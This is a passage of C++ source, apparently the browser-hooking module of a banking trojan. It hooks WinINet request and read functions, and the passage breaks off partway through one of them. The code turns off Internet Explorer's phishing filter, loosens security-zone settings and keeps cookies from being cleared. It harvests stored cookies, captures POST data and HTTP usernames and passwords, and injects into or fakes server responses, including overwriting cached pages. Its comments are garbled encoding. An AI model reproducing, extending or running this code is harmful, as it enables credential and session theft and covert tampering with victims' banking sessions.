#include <windows.h>
#include <shlobj.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"

#include "dynamicconfig.h"
#include "localconfig.h"
#include "cryptedstrings.h"
#include "wininethook.h"
#include "report.h"
#include "httpgrabber.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\sync.h"
#include "..\common\fs.h"
#include "..\common\wininet.h"

#include "..\common\debug.h"
#include "..\common\registry.h"
#include "..\common\process.h"

#if(BO_WININET > 0)

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Connection table.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

typedef struct
{
  HINTERNET handle;                     //The handle of the connection.
  HANDLE readEvent;                     //Event reading (when injected).

  void *postData;                       //POST-spoofed data.

  HttpGrabber::INJECTFULLDATA *injects; //List izhektov used for the connection.
  DWORD injectsCount;                   //Count. elements in the injects.

  LPBYTE context;                       //Spoofed content.
  DWORD contentSize;                    //The size of the content. If zero ((DWORD) -1), then the data esche not think so.
  DWORD contentPos;                     //The position of the contents.
  
  HINTERNET fakeRequest;                //Handle to create fake query.
}WININETCONNECTION;

static WININETCONNECTION *connections;
static DWORD connectionsCount;
static CRITICAL_SECTION connectionsCs;

/*
  ����� ������������ � �������.

  IN handle - �����.

  Return    - ������ ���������� � �������, ��� (DWORD)-1 ���� �� �������.
*/
static DWORD connectionFind(HINTERNET handle)
{
  if(handle != NULL)for(DWORD i = 0; i < connectionsCount; i++)if(connections[i].handle == handle)return i;
  return (DWORD)-1;
}

/*
  ���������� ���������� � �������.

  IN handle - �����.

  Return    - ������ ���������� � �������, ��� (DWORD)-1 ���� �� �������.
*/
static DWORD connectionAdd(HINTERNET handle)
{
  WININETCONNECTION *newConnection = NULL;
  DWORD index                      = (DWORD)-1;

  if(handle == NULL)return index;

  //Ischim free.
  for(DWORD i = 0; i < connectionsCount; i++)if(connections[i].handle == NULL)
  {    
    newConnection = &connections[i];
    index = i;
    break;
  }
  
  //Dobovlyaem new.
  if(newConnection == NULL && Mem::reallocEx(&connections, sizeof(WININETCONNECTION) * (connectionsCount + 1)))
  {
    index         = connectionsCount++;
    newConnection = &connections[index];
  }

  //Fill.
  if(newConnection != NULL)
  {
    newConnection->handle       = handle;
    newConnection->readEvent    = CWA(kernel32, CreateEventW)(NULL, FALSE, FALSE, NULL);
    newConnection->postData     = NULL;
    newConnection->injects      = NULL;
    newConnection->injectsCount = 0;
    newConnection->context      = NULL;
    newConnection->contentSize  = (DWORD)-1;
    newConnection->contentPos   = 0;
    newConnection->fakeRequest  = NULL;
  }  
  return index;
}

/*
  ����� ������������ � �������, � ��� ���������� � ������ ��������.

  IN handle - �����.

  Return    - ������ ���������� � �������, ��� (DWORD)-1 ���� �� �������.
*/
static DWORD connectionFindEx(HINTERNET handle)
{
  DWORD index = connectionFind(handle);
  if(index == (DWORD)-1)index = connectionAdd(handle);
  return index;
}

/*
  �������� ���������� �� �������.

  IN index - ������ ����������.
*/
static void connectionRemove(DWORD index)
{
  WININETCONNECTION *newConnection = &connections[index];
  
  newConnection->handle = NULL;
  CWA(kernel32, CloseHandle)(newConnection->readEvent);
  Mem::free(newConnection->postData);
  HttpGrabber::_freeInjectFullDataList(newConnection->injects, newConnection->injectsCount);
  Mem::free(newConnection->context);
  if(newConnection->fakeRequest != NULL)Wininet::_closeWithParents(newConnection->fakeRequest);

  //Optimization.
  {
    DWORD newCount = connectionsCount;
    while(newCount > 0 && connections[newCount - 1].handle == NULL)newCount--;
    if(newCount != connectionsCount)
    {
      if(newCount == 0)
      {
        Mem::free(connections);
        connections = NULL;
      }
      else Mem::reallocEx(&connections, sizeof(WININETCONNECTION) * newCount);
      connectionsCount = newCount;
    }
  }
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////

void WininetHook::init(const LPWSTR homePage)
{
  connections      = NULL;
  connectionsCount = 0;
  CWA(kernel32, InitializeCriticalSection)(&connectionsCs);

  if(coreData.integrityLevel > Process::INTEGRITY_LOW)
  {
    //Home.
    if(homePage != NULL && *homePage != 0)
    {
      CSTR_GETW(startPageValue, regvalue_ie_startpage);
      CSTR_GETW(startPagePath,  regpath_ie_startpage);
      
      Registry::_setValueAsString(HKEY_CURRENT_USER, startPagePath, startPageValue, homePage, Str::_LengthW(homePage));
    }
    
    //Disable Phishing Filter.
    {
      CSTR_GETW(key, regpath_ie_phishingfilter);
      CSTR_GETW(var1, regvalue_ie_phishingfilter1);
      CSTR_GETW(var2, regvalue_ie_phishingfilter2);

      const LPWSTR vars[] = {var1, var2};
      for(BYTE i = 0; i < sizeof(vars) / sizeof(LPWSTR); i++)if(Registry::_getValueAsDword(HKEY_CURRENT_USER, key, vars[i]) != 0)Registry::_setValueAsDword(HKEY_CURRENT_USER, key, vars[i], 0);
    }
  
    //Do not clear cookies on exit from IE.
    {
      CSTR_GETW(key, regpath_ie_privacy);
      CSTR_GETW(var, regvalue_ie_privacy_cookies);

      if(!Registry::_valueExists(HKEY_CURRENT_USER, key, var) || Registry::_getValueAsDword(HKEY_CURRENT_USER, key, var) != 0)
      {
        Registry::_setValueAsDword(HKEY_CURRENT_USER, key, var, 0);
      }
    }
    
    //Setting the Internet zone.
    //FIXME: do it through COM.
    {
      CSTR_GETW(key, regpath_ie_zones);
      CSTR_GETW(var1, regpath_ie_zones_1406);
      CSTR_GETW(var2, regpath_ie_zones_1609);

      const LPWSTR vars[] = {var1, var2};
      WCHAR keyBuf[CryptedStrings::len_regpath_ie_zones + 10];
      
      for(BYTE i = 0; i < 5; i++)if(Str::_sprintfW(keyBuf, sizeof(keyBuf) / sizeof(WCHAR), key, i) > 0)
      {
        for(BYTE a = 0; a < sizeof(vars) / sizeof(LPWSTR); a++)  
        {
          if(Registry::_getValueAsDword(HKEY_CURRENT_USER, keyBuf, vars[a]) != 0)Registry::_setValueAsDword(HKEY_CURRENT_USER, keyBuf, vars[a], 0);
        }
      }
    }
  }
}

void WininetHook::uninit(void)
{

}

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Getting the cookies.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

enum
{
  COOKIESFLAG_DELETE = 0x1, //Delete cookies.
  COOKIESFLAG_SAVE   = 0x2  //Save cookies.
};

//The buffer size for INTERNET_CACHE_ENTRY_INFOW.
#define WININETCOOKIE_BUFFER_SIZE (sizeof(INTERNET_CACHE_ENTRY_INFOW) + INTERNET_MAX_URL_LENGTH * sizeof(WCHAR) + MAX_PATH * sizeof(WCHAR))

/*
  ������ ���� Wininet �� �����.

  IN fileName - ��� �����.

  Return      - ������ ����(������ ����� Mem), ��� NULL - � ������ ������.
*/
static LPSTR __inline parseWininetCookies(LPWSTR fileName)
{
  Fs::MEMFILE mf;
  LPSTR output = NULL;

  if(Fs::_fileToMem(fileName, &mf, 0))
  {
    LPSTR *list;
    DWORD listCount = Str::_splitToStringsA((LPSTR)mf.data, mf.size, &list, Str::STS_TRIM, 0);
    Fs::_closeMemFile(&mf);

    if(listCount != (DWORD)-1)
    {
      if(listCount % 9 == 0)
      {
        CSTR_GETA(reportPathFormat, wininethook_report_cookie_path);
        CSTR_GETA(reportFormat, wininethook_report_cookie_data);
        
        LPSTR prevPath = NULL, path, name, value;
        char buf[INTERNET_MAX_URL_LENGTH + 20];
        int bufSize;

        for(DWORD i = 0; i < listCount; i += 9)
        {
          //Mean something.
          if((name  = list[i + 0]) == NULL || *name  == 0 ||
             (value = list[i + 1]) == NULL || *value == 0 ||
             (path  = list[i + 2]) == NULL || *path  == 0)
          {
            //Nerveny format.
            Mem::free(output);
            output = NULL;
            break;
          }

          //Adding track.
          if(Str::_CompareA(prevPath, path, -1, -1) != 0)
          {
            bufSize = Str::_sprintfA(buf, sizeof(buf), reportPathFormat, path);
            if(bufSize == -1 || !Str::_CatExA(&output, buf, bufSize)){output = NULL; break;}
          }

          //Dobovlenie Cook.
          {
            bufSize = Str::_sprintfA(buf, sizeof(buf), reportFormat, name, value);
            if(bufSize == -1 || !Str::_CatExA(&output, buf, bufSize)){output = NULL; break;}
          }

          prevPath = path;
        }
      }

      Mem::freeArrayOfPointers(list, listCount);
    }
  }
  return output;
}

typedef struct
{
  DWORD flags;
  LPSTR list;
  DWORD listSize;
}WININETCOOKIESPROCFINDDATA;

/*
  ������ Fs::_findFiles().
*/
static bool wininetCookiesFindProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
  WININETCOOKIESPROCFINDDATA *wcpfd = (WININETCOOKIESPROCFINDDATA *)data;
  WCHAR file[MAX_PATH];

  if(Fs::_pathCombine(file, path, (LPWSTR)fileInfo->cFileName))
  {
    if(wcpfd->flags & COOKIESFLAG_SAVE)
    {
      LPSTR curCookie = parseWininetCookies(file);
      if(curCookie != NULL)
      {
        DWORD curCookieSize = Str::_LengthA(curCookie);
        if(Mem::reallocEx(&wcpfd->list, wcpfd->listSize + curCookieSize))
        {
          Mem::_copy(wcpfd->list + wcpfd->listSize, curCookie, curCookieSize);
          wcpfd->listSize += curCookieSize;
        }
        Mem::free(curCookie);
      }
    }

    if(wcpfd->flags & COOKIESFLAG_DELETE)
    {
      Fs::_removeFile(file);
    }
  }
  return true;
}

/*
  ��������� ����� Wininet.

  IN flags     - ����� COOKIESFLAG_*.
  OUT list     - ������ ������ �����.
  OUT listSize - ������ ������ �����.
*/
static void wininetCookiesProc(DWORD flags, LPSTR *list, LPDWORD listSize)
{
  CSTR_GETW(mask1, file_wininet_cookie_mask);
  const LPWSTR mask[] = {mask1};

  WININETCOOKIESPROCFINDDATA wcpfd;
  wcpfd.flags    = flags;
  wcpfd.list     = NULL;
  wcpfd.listSize = 0;

  WCHAR path[MAX_PATH];
  if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_COOKIES, NULL, SHGFP_TYPE_CURRENT, path) == S_OK)
  {
    CSTR_GETW(pathLow, path_wininet_cookie_low);

    Fs::_findFiles(path, mask, sizeof(mask) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES, wininetCookiesFindProc, &wcpfd, NULL, 0, 0);
    if(Fs::_pathCombine(path, path, pathLow))
    {
      Fs::_findFiles(path, mask, sizeof(mask) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES, wininetCookiesFindProc, &wcpfd, NULL, 0, 0);
    }
  }

  if(flags & COOKIESFLAG_SAVE)
  {
    *list     = wcpfd.list;
    *listSize = wcpfd.listSize;
  }
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////

void WininetHook::_getCookies(void)
{
  LPSTR cookies;
  DWORD cookiesSize;

  //We get a cookie.
  wininetCookiesProc(COOKIESFLAG_SAVE, &cookies, &cookiesSize);
  if(cookiesSize == 0)cookies = NULL;

  //Pishim log.
  {
    CSTR_GETW(header, wininethook_report_cookies);
    CSTR_GETA(empty, wininethook_report_cookies_empty);
    Report::writeStringFormat(BLT_COOKIES, NULL, NULL, header, cookies == NULL ? empty : cookies);
  }
  Mem::free(cookies);
}

void WininetHook::_removeCookies(void)
{
  wininetCookiesProc(COOKIESFLAG_DELETE, NULL, NULL);
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Inject.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

/*
  ��������� ���� �� InternetStatusCallback ��� ������ � ��� ���������.

  IN handle - HINTERNET.
  IN hooker - �������-����������� � ���������� InternetStatusCallbacks.
*/
static void hookInternetStatusCallbacks(HINTERNET handle, void *hooker)
{
  HINTERNET parentHandle;
  DWORD size;
  BOOL ok;
  void *callback;

  for(;;)
  {
    size = sizeof(void *);
    if(CWA(wininet, InternetQueryOptionA)(handle, INTERNET_OPTION_CALLBACK, &callback, &size) != FALSE)
    {
      //FIXME:
    }
    
    
    //Obtain a parent.
    size = sizeof(HINTERNET);
    ok   = CWA(wininet, InternetQueryOptionA)(handle, INTERNET_OPTION_PARENT_HANDLE, &parentHandle, &size);
    if(ok == FALSE || parentHandle == NULL)break;
    handle = parentHandle;
  }
}

#define READCONTEXT_BUFFER_SIZE 4096 //Read buffer for readAllContext ().

/*
  ������� ��� readAllContext().
*/
static void CALLBACK readAllContextCallback(HINTERNET internet, DWORD_PTR context, DWORD internetStatus, LPVOID statusInformation, DWORD statusInformationLength)
{
  if(internetStatus == INTERNET_STATUS_REQUEST_COMPLETE || internetStatus == INTERNET_STATUS_CONNECTION_CLOSED)
  {
    CWA(kernel32, EnterCriticalSection)(&connectionsCs);
    DWORD connectionIndex = connectionFind(internet);
    if(connectionIndex != (DWORD)-1)
    {
      CWA(kernel32, SetEvent)(connections[connectionIndex].readEvent);
    }
#   if(BO_DEBUG > 0) && defined WDEBUG1
    else WDEBUG1(WDDT_INFO, "Unknown request=0x%p.", internet);
#   endif
    CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
  }
}

/*
  ������ ����� ��������� � �����.

  IN request      - ������.
  IN readEvent    - ������� �������������� � �����������.
  OUT context     - �����.
  OUT contentSize - ������ ������.

  Retrun          - true - � ������ ������,
                    false - � ������ ������.
*/
static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context, LPDWORD contentSize)
{
  INTERNET_STATUS_CALLBACK oldCallback;
  LPBYTE buffer;

  //Create basic objects.
  {
    CWA(kernel32, ResetEvent)(readEvent); //Paranoia.

    if((buffer = (LPBYTE)Mem::alloc(READCONTEXT_BUFFER_SIZE)) == NULL)
    {
      Mem::free(buffer);
      return false;
    }

    //Substitute for these compounds.
    {  
      DWORD size = sizeof(DWORD_PTR);
      oldCallback = CWA(wininet, InternetSetStatusCallback)(request, readAllContextCallback);
    }

    *context     = NULL;
    *contentSize = 0;
  }

  //Read.
  bool ok = true;
  {
    INTERNET_BUFFERSA internetBuffer;

    Mem::_zero(&internetBuffer, sizeof(INTERNET_BUFFERSA));
    internetBuffer.dwStructSize = sizeof(INTERNET_BUFFERSA);
    internetBuffer.lpvBuffer    = buffer;

    for(;;)
    {
      internetBuffer.dwBufferLength = READCONTEXT_BUFFER_SIZE;
      if(CWA(wininet, InternetReadFileExA)(request, &internetBuffer, IRF_NO_WAIT, 0) == FALSE)
      {
        if(CWA(kernel32, GetLastError)() == ERROR_IO_PENDING)
        {
          /*
            ������� ��� ����� �������� �������, �.�. � ���� ����� ��������� ������ ���� ������
            ������� ���� readAllContextCallback(). � �� �� ����� �� ������� ������ �� �������.
            ����� ����� ������ ���������� �� InternetSetStatusCallback().
          */
          Sync::_waitForMultipleObjectsAndDispatchMessages(1, &readEvent, false, INFINITE);
          continue;
        }

        ok = false;
        break;
      }

      //Read the entire context.
      if(internetBuffer.dwBufferLength == 0)break;

      //Allocate
      if(!Mem::reallocEx(context, *contentSize + internetBuffer.dwBufferLength))
      {
        ok = false;
        break;
      }

      //Copy.
      Mem::_copy(*context + *contentSize, buffer, internetBuffer.dwBufferLength);
      *contentSize += internetBuffer.dwBufferLength;
    }
  }

  //Destroy the basic objects.
  {
    CWA(wininet, InternetSetStatusCallback)(request, oldCallback == INTERNET_INVALID_STATUS_CALLBACK ? NULL : oldCallback);
    Mem::free(buffer);
    if(ok == false)Mem::free(*context);
  }

  return ok;
}

/*
  �������� ������������ � ������ ������ HTTP-������.
  
  IN OUT request         - ����� �������.
  OUT buffer             - ����� ��� �������� ������. NULL - ��� �������� ���������� �������.
  IN numberOfBytesToRead - ������ ������.
  OUT numberOfBytesRead  - ���. ���������� ����.

  Return                 - (-1) - ������� ����������� ������� ������.
                           � ������ ������, ������� ������ ������ ����������� �������, ��� ��������.
*/
static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBytesToRead, LPDWORD numberOfBytesRead)
{
  int retVal = -1;
  CWA(kernel32, EnterCriticalSection)(&connectionsCs);
  DWORD connectionIndex = connectionFind(*request);

  if(connectionIndex != (DWORD)-1 && connections[connectionIndex].injectsCount > 0)
  {
    WININETCONNECTION *wc = &connections[connectionIndex];

    if(HttpGrabber::_isFakeData(wc->injects, wc->injectsCount))
    {
      /*
      DWORD newContext     = 0;
      DWORD newContextSize = sizeof(DWORD_PTR);
      if(CWA(wininet, InternetQueryOptionA)(*request, INTERNET_OPTION_CONTEXT_VALUE, &newContext, &newContextSize) == TRUE)
      {
        CWA(wininet, InternetSetOptionA)(wc->fakeRequest, INTERNET_OPTION_CONTEXT_VALUE, &newContext, newContextSize);
      }
      */
      *request = wc->fakeRequest;
    }
    else
    {
      if(numberOfBytesRead != NULL)*numberOfBytesRead = 0;

      //Inject is not applied.
      if(wc->contentSize == (DWORD)-1)
      {
        LPBYTE contextBuffer;
        DWORD contextBufferSize;
        
        //Read and replaces the contents.
        bool ok;
        {
          HANDLE readEvent = wc->readEvent;
          CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
          ok = readAllContext(*request, readEvent, &contextBuffer, &contextBufferSize);
          CWA(kernel32, EnterCriticalSection)(&connectionsCs);
        }
        
        //Perepoluchaem data connection.
        if(ok == false || (connectionIndex = connectionFind(*request)) == (DWORD)-1)
        {
          if(ok)Mem::free(contextBuffer);
          retVal = (int)FALSE;
          CWA(kernel32, SetLastError)(ERROR_INTERNET_INTERNAL_ERROR);
        }
        else
        {
          wc = &connections[connectionIndex];

          DWORD urlSize;
          LPSTR url = (LPSTR)Wininet::_queryOptionExA(*request, INTERNET_OPTION_URL, &urlSize);
          if(HttpGrabber::_executeInjects(url, &contextBuffer, &contextBufferSize, wc->injects, wc->injectsCount))
          {
            //Substitute for the cache.
            LPWSTR urlW = Str::_ansiToUnicodeEx(url, urlSize);
            if(urlW != NULL)
            {
              DWORD cacheSize = 4096;
              INTERNET_CACHE_ENTRY_INFOW *cacheEntry = (INTERNET_CACHE_ENTRY_INFOW *)Mem::alloc(cacheSize);

              if(cacheEntry != NULL)
              {
                cacheEntry->dwStructSize = sizeof(INTERNET_CACHE_ENTRY_INFOW);
                if(CWA(wininet, GetUrlCacheEntryInfoW)(urlW, cacheEntry, &cacheSize) && cacheEntry->lpszLocalFileName && *cacheEntry->lpszLocalFileName != 0)
                {
                  Fs::_saveToFile(cacheEntry->lpszLocalFileName, contextBuffer, contextBufferSize);
#                 if defined WDEBUG2
                  WDEBUG2(WDDT_INFO, "Changed local cache urlW=\"%s\", cacheEntry->lpszLocalFileName=\"%s\"", urlW, cacheEntry->lpszLocalFileName);
#                 endif
                }
                Mem::free(cacheEntry);
              }
              Mem::free(urlW);
            }
          }
          Mem::free(url);

          wc->context     = contextBuffer;
          wc->contentSize = contextBufferSize;
        }
      }

      //Inject applied, we give the results.
      if(wc->contentSize != (DWORD)-1 && retVal == -1)
      {
        DWORD maxSize = wc->contentSize - wc->contentPos;
        if(maxSize > 0)
        {
          if(buffer == NULL)numberOfBytesToRead = Crypt::mtRandRange(4096, 8192);
          if(numberOfBytesToRead < maxSize)maxSize = numberOfBytesToRead;

          if(buffer != NULL)
          {
            Mem::_copy(buffer, wc->context + wc->contentPos, maxSize);
            wc->contentPos += maxSize;
          }
        }

        if(numberOfBytesRead != NULL)*numberOfBytesRead = maxSize;
        retVal = (int)TRUE;
      }
    }
  }
  CWA(kernel32, LeaveCriticalSection)(&connectionsCs);

  return retVal;
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Grabber.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

/*
  ���������� HttpGrabber::REQUESTDATA.

  OUT requestData - ���������.
  IN request      - ����� �������� �������.
  IN postData     - POST-������.
  IN postDataSize - ������ POST-������.

  Return          - true - � ������ ������,
                    false - � ������ ������.
*/
static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET request, const void *postData, DWORD postDataSize)
{
  Mem::_zero(requestData, sizeof(HttpGrabber::REQUESTDATA));
  
  requestData->flags = HttpGrabber::RDF_WININET; 

  //Handle to the query.
  requestData->handle = (void *)request;
  
  //Obtain the URL.
  if((requestData->url = (LPSTR)Wininet::_queryOptionExA(request, INTERNET_OPTION_URL, &requestData->urlSize)) == NULL)
  {
#   if defined WDEBUG0
    WDEBUG0(WDDT_ERROR, "Wininet::_queryOptionExA failed.");
#   endif
    return false;
  }

  //We get the referrer.
  requestData->referer = Wininet::_queryInfoExA(request, HTTP_QUERY_REFERER | HTTP_QUERY_FLAG_REQUEST_HEADERS, &requestData->refererSize, NULL);
  
  //Obtain a Verb.
  {
    char verb[10];
    DWORD verbSize = sizeof(verb) / sizeof(char) - 1;
    if(CWA(wininet, HttpQueryInfoA)(request, HTTP_QUERY_REQUEST_METHOD, verb, &verbSize, NULL) == TRUE && verbSize > 1)
    {
      if(verb[0] == 'P' && verbSize == 4)requestData->verb = HttpGrabber::VERB_POST;
      else if(verb[0] == 'G' && verbSize == 3)requestData->verb = HttpGrabber::VERB_GET;
      else
      {
#       if defined WDEBUG0
        WDEBUG0(WDDT_ERROR, "Unknown verb.");
#       endif
        return false;
      }
    }
  }

  //Obtain the Content-Type.
  requestData->contentType = Wininet::_queryInfoExA(request, HTTP_QUERY_CONTENT_TYPE | HTTP_QUERY_FLAG_REQUEST_HEADERS, &requestData->contentTypeSize, NULL);
  
  //Obtain the POST-data.
  if(postDataSize > 0 && postDataSize <= HttpGrabber::MAX_POSTDATA_SIZE && postData != NULL)
  {
    requestData->postData     = (void *)postData;
    requestData->postDataSize = postDataSize;
  }

  //Obtain the authorization data.
  {
    bool ok = false;
    DWORD size;
    LPWSTR userName = (LPWSTR)Wininet::_queryOptionExW(request, INTERNET_OPTION_USERNAME, &size);
    
    if(userName != NULL && *userName != 0)
    {
      LPWSTR password = (LPWSTR)Wininet::_queryOptionExW(request, INTERNET_OPTION_PASSWORD, &size);
      if(password != NULL && *password != 0)
      {
        requestData->authorizationData.userName = userName;
        requestData->authorizationData.password = password;
        ok = true;
      }
      if(!ok)Mem::free(password);
    }
    if(!ok)Mem::free(userName);
  } 
  
  //The current configuration.
  requestData->dynamicConfig = DynamicConfig::getCurrent();
  requestData->localConfig   = LocalConfig::getCurrent();
  return true;
}

/*
  �������� ������������ � ������ �������� HTTP-�������.

  IN request          - ������.
  IN OUT postData     - POST-������.
  IN OUT postDataSize - ������ postData.

  Return              - (-1) - ������� ����������� ������� ������� �������.
                        � ������ ������, ������� ������ ������ ����������� �������, ��� ��������.
*/
static int onHttpSendRequest(HINTERNET request, void **postData, LPDWORD postDataSize)
{
  int retVal = -1;
  HttpGrabber::REQUESTDATA requestData;

  if(fillRequestData(&requestData, request, *postData, *postDataSize))
  {
    DWORD result = HttpGrabber::analizeRequestData(&requestData);

    if(result & HttpGrabber::ANALIZEFLAG_URL_BLOCKED)
    {
      CWA(kernel32, SetLastError)(ERROR_HTTP_INVALID_SERVER_RESPONSE);
      retVal = (int)FALSE;
    }
    else
    {
      DWORD connectionIndex;

      if(result & HttpGrabber::ANALIZEFLAG_URL_INJECT)
      {
        bool addInjects       = true;
        HINTERNET fakeRequest = NULL;
        
        if(HttpGrabber::_isFakeData(requestData.injects, requestData.injectsCount))
        {
          HttpGrabber::INJECTFULLDATA *fakeData = &requestData.injects[0];

          //Check the results.
          if((fakeRequest = HttpGrabber::_createFakeResponse(&requestData, fakeData)) == NULL)
          {
            addInjects = false;
          }
          else
          {
            retVal = (int)TRUE;
          }
        }          
        else
        {
          {
            CSTR_GETA(header, wininethook_http_acceptencoding);
            CWA(wininet, HttpAddRequestHeadersA)(request, header, -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
          }
          {
            CSTR_GETA(header, wininethook_http_te)
            CWA(wininet, HttpAddRequestHeadersA)(request, header, -1, HTTP_ADDREQ_FLAG_REPLACE);
          }
          {
            CSTR_GETA(header, wininethook_http_ifmodified)
            CWA(wininet, HttpAddRequestHeadersA)(request, header, -1, HTTP_ADDREQ_FLAG_REPLACE);
          }
        }
        
        //Add injected to the list.
        CWA(kernel32, EnterCriticalSection)(&connectionsCs);
        if(addInjects == false || (connectionIndex = connectionFindEx(request)) == (DWORD)-1)
        {
#         if defined WDEBUG0
          WDEBUG0(WDDT_ERROR, "Fatal error.");
#         endif          
          HttpGrabber::_freeInjectFullDataList(requestData.injects, requestData.injectsCount);
          if(fakeRequest != NULL)Wininet::_closeWithParents(fakeRequest);
        }
        else
        {
          //Old injected can suschestovat because one request can be sent several times.
          HttpGrabber::_freeInjectFullDataList(connections[connectionIndex].injects, connections[connectionIndex].injectsCount);
          Mem::free(connections[connectionIndex].context);

          connections[connectionIndex].context     = NULL;
          connections[connectionIndex].contentPos  = 0;
          connections[connectionIndex].contentSize = (DWORD)-1;

#         if(BO_DEBUG > 0) && defined WDEBUG0
          if(connections[connectionIndex].injects != NULL)WDEBUG0(WDDT_WARNING, "(connections[connectionIndex].injects != NULL) == true");
#         endif          

          connections[connectionIndex].injects      = requestData.injects;
          connections[connectionIndex].injectsCount = requestData.injectsCount;
          connections[connectionIndex].fakeRequest  = fakeRequest;
        }
        CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
      }

      if(result & HttpGrabber::ANALIZEFLAG_POSTDATA_REPLACED)
      {
        *postData     = requestData.postData;
        *postDataSize = requestData.postDataSize;

        CWA(kernel32, EnterCriticalSection)(&connectionsCs);
        if((connectionIndex = connectionFindEx(request)) != (DWORD)-1)
        {
          Mem::free(connections[connectionIndex].postData);
#         if(BO_DEBUG > 0) && defined WDEBUG0
          if(connections[connectionIndex].postData != NULL)WDEBUG0(WDDT_WARNING, "(connections[connectionIndex].postData != NULL) == true");
#         endif          
          connections[connectionIndex].postData = requestData.postData;
        }
        CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
      }
    }
  }

  HttpGrabber::_freeRequestData(&requestData);
  return retVal;
}

#define httpSendRequestBody(postfix) \
{\
  if(Core::isActive())\
  {\
    if(headersLength != 0 && headers != NULL)\
    {\
      CWA(wininet, HttpAddRequestHeaders##postfix)(request, headers, headersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);\
      headersLength = 0;\
      headers       = NULL;\
    }\
\
    int r = onHttpSendRequest(request, &optional, &optionalLength);\
    if(r != -1)return (BOOL)r;\
  }\
  return CWA(wininet, HttpSendRequest##postfix)(request, headers, headersLength, optional, optionalLength);\
}

BOOL WINAPI WininetHook::hookerHttpSendRequestW(HINTERNET request, LPWSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength)
{
  httpSendRequestBody(W);
}

BOOL WINAPI WininetHook::hookerHttpSendRequestA(HINTERNET request, LPSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength)
{
  httpSendRequestBody(A);
}

#define httpSendRequestExBody(postfix) \
{\
  INTERNET_BUFFERS##postfix tb;\
\
  if(Core::isActive())\
  {\
    if(buffersIn == NULL)\
    {\
      Mem::_zero(&tb, sizeof(INTERNET_BUFFERS##postfix));\
      tb.dwStructSize = sizeof(INTERNET_BUFFERS##postfix);\
    }\
    else\
    {\
      Mem::_copy(&tb, buffersIn, sizeof(INTERNET_BUFFERS##postfix));\
\
      if(tb.dwHeadersLength != 0 && tb.lpcszHeader != NULL)\
      {\
        CWA(wininet, HttpAddRequestHeaders##postfix)(request, tb.lpcszHeader, tb.dwHeadersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);\
        tb.lpcszHeader     = NULL;\
        tb.dwHeadersLength = 0;\
      }\
    }\
\
    int r = onHttpSendRequest(request, &tb.lpvBuffer, &tb.dwBufferLength);\
    if(r != -1)return (BOOL)r;\
    buffersIn = &tb;\
  }\
  return CWA(wininet, HttpSendRequestEx##postfix)(request, buffersIn, buffersOut, flags, context);\
}

BOOL WINAPI WininetHook::hookerHttpSendRequestExW(HINTERNET request, LPINTERNET_BUFFERSW buffersIn, LPINTERNET_BUFFERSW buffersOut, DWORD flags, DWORD_PTR context)
{
  httpSendRequestExBody(W);
}

BOOL WINAPI WininetHook::hookerHttpSendRequestExA(HINTERNET request, LPINTERNET_BUFFERSA buffersIn, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context)
{
  httpSendRequestExBody(A);
}

BOOL WINAPI WininetHook::hookerInternetCloseHandle(HINTERNET handle)
{
#if defined WDEBUG0
  WDEBUG0(WDDT_INFO, "Called");
#endif
  
  //Closing handle interrupts the reading of data from other streams.
  BOOL r = CWA(wininet, InternetCloseHandle)(handle);

  if(Core::isActive())//Might be a memory leak.
  {
    CWA(kernel32, EnterCriticalSection)(&connectionsCs);
    DWORD connectionIndex = connectionFind(handle);
    if(connectionIndex != (DWORD)-1)
    {
      connectionRemove(connectionIndex);
#     if defined WDEBUG2
      WDEBUG2(WDDT_INFO, "Connection 0x%p removed from table, current connectionsCount=%u.", handle, connectionsCount);
#     endif
    }
    CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
  }

  return r;
}

BOOL WINAPI WininetHook::hookerInternetReadFile(HINTERNET handle, LPVOID buffer, DWORD numberOfBytesToRead, LPDWORD numberOfBytesReaded)
{
#if defined WDEBUG0
  WDEBUG0(WDDT_INFO, "Called");
#endif

  if(Core::isActive() && buffer != NULL && numberOfBytesToRead > 0 && numberOfBytesReaded != NULL)
  {
    int r = onInternetReadFile(&handle, buffer, numberOfBytesToRead, numberOfBytesReaded);
    if(r != -1)return (BOOL)r;
  }
  return CWA(wininet, InternetReadFile)(handle, buffer, numberOfBytesToRead, numberOfBytesReaded);
}

BOOL WINAPI WininetHook::hookerInternetReadFileExA(HINTERNET handle, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context)
{
#if defined WDEBUG0
  WDEBUG0(WDDT_INFO, "Called");
#endif
  
  if(Core::isActive() && buffersOut != NULL && buffersOut->lpvBuffer != NULL && buffersOut->dwBufferLength > 0)
  {
    int r = onInternetReadFile(&handle, buffersOut->lpvBuffer, buffersOut->dwBufferLength, &buffersOut->dwBufferLength);
    if(r != -1)return (BOOL)r;
  }
